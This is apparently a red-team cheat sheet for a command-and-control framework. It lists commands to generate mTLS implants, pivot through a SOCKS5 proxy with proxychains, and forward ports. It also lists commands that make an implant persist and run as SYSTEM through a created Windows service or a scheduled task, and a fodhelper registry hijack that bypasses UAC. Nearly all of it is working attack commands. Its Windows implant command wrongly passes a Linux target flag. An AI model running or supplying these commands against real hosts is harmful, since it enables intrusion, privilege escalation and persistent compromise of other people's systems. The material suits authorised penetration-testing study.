# Making Payloads
## Windows
```bash
generate -l --os linux --mtls <ip>:<port>
```
## Linux
```bash
generate -l --os linux --mtls <ip>:<port>
```
# SOCKS5 Proxy
```bash
socks5 start
```
Interact with the following
NOTE: proxychains only send tcp, test with nc and known port
```bash
proxychains4 nc <ip> <port>
```
# Making Service
If you make a service as a local admin the implant will catch as SYSTEM
```bash
execute powershell.exe -- -c sc.exe create svcName binPath= "C:/path/to/implant.exe" start= auto
```
This creates a service named svcName that executes C:/path/to/implant.exe
```bash
execute powershell.exe -- -c sc.exe start svcName
```
This starts the service named svcName (executing the implant)
# Scheduled Tasks
You can set a schtask to run as SYSTEM if you are an admin
```bash
execute cmd.exe /c -- schtasks /create /tn "taskName" /tr "C:\path\to\implant.exe" /sc once /st 00:00 /ru "SYSTEM" /f
```
This makes a scheduled task called taskName that executes C:\path\to\implant.exe
```bash
execute cmd.exe /c -- schtasks /run /tn "taskName"
```
This starts the scheduled task so the implant is executed
```bash
execute cmd.exe /c -- schtasks /end /tn "taskName"
```
This will stop the task so you can rerun for another implant
# UAC Bypass Split Token
This is for if you are a medium integrity admin. It is a UAC bypass so you can be a high integrity admin.
```bash
execute powershell.exe -- -c "New-Item -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Value 'C:\path\to\implant.exe' -Force"
```
This overwrites a registry key with our implant
```bash
execute powershell.exe -- -c "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"
```
This makes the key executable
```bash
execute powershell.exe -- -c "Start-Process 'C:\Windows\System32\fodhelper.exe'"
```
This starts the injected process
# Portfwd
forwards to your localhost
```bash
portfwd add -r <remote>:<remote>
```
